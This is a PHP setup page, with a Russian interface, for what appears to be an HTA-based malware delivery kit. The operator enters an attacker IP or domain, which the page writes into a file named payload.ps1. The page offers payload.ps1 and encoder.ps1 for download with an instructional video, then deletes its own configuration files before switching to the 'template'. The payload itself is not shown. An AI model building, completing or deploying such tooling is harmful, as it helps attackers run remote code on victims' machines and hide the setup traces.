<?php
session_start();

if(!empty($_POST['ip'])){$ip = $_POST['ip'];}else{$ip = '$ip';}

//Изменение файла send.py
$path_to_file = 'payload.ps1';
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace('$ip',$ip,$file_contents);
	file_put_contents($path_to_file,$file_contents);


//Сохранение состояние изменения/создания файла
if(isset($_POST['step1'])){$_SESSION['step1'] = 'Файл payload.ps1 обновлен';}

//Удаление файла конфигурации
if(!empty($_POST['delete'])){$delete = $_POST['delete'];}else{$delete ='';}
if ($delete == "delete") {          
    unlink('config.php');
    unlink('encoder.ps1');
    unlink('payload.ps1');
    unlink('download.php');
    unlink('1.mp4');
    session_destroy();
    header('Location: index.php');
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Настройка</title>

	<style type="text/css">
	.inp{
		border:1px solid grey;
		border-radius:3px;
	}
	.button{
		border:1px solid grey;
		border-radius:3px;
		background-color: white;
	}
	.button:hover{
		background-color: grey;
	}
	</style>
</head>
<body>
<div class="header" align="center">
	<p> Прежде, чем начать использование шаблона, необходимо настроить hta-файл</b></p>
	<p> Настройка <b>payload.ps1</b></p>
</div>

<div style="margin:30px; padding:30px;min-width: 800px;border:2px solid grey;border-radius:12px">
	<div id="wrapper" style="text-align: center;">
		<div style="display: inline-block; vertical-align: top; margin-right:50px">
		<form action="#" method="POST">

			<span> IP-адрес (домен)</span><input class="inp" style="margin-right:70px;margin-left: 20px" name="ip" placeholder="http://ip or http://domen"><br><br>
			<input type="hidden" name="step1" value="step1">
			<button type="submit" class="button">Изменить</button>
		</form><br>
		<div style="color:green"><?php if(isset($_SESSION['step1'])){echo $_SESSION['step1'];}?></div>
		</div>
		<div style='display: inline-block; vertical-align: top;'>
		<img style=" box-shadow: 0 0 10px rgba(0,0,0,0.5);" src="example.jpg" width="800px">
		</div>
	</div>
</div>

<div class="header" align="center">
Инструкция и файлы
</div>
<div style="margin:30px; padding:30px;min-width: 800px;border:2px solid grey;border-radius:12px">
	<div id="wrapper" style="text-align: center;">
		<div style="display: inline-block; vertical-align: top; margin:50px 50px 0 0">
		<form action="download.php?file=payload.ps1" method="POST">
		<input type="submit" value="Cкачать payload.ps1">
		</form><br>
		<form action="download.php?file=encoder.ps1" method="POST">
		<input type="submit" value="Cкачать encoder.ps1">
		</form><br>
		</div>
		<div style='display: inline-block; vertical-align: top;'>

			<video width="520" height="240" controls>
			<source src="1.mp4" type="video/mp4">
		</video>
		</div>
	</div>
</div>

<div align="center">  
<p>Удалить страницу конфигурации и перейти к шаблону?</p>
<form action="#" method="POST">
<input type="hidden" name="delete" value="delete">
<button style="padding:10px 30px" type="submit" class="button">GO</button>
</form>
<br><br><br>
</div>

</body>
</html>



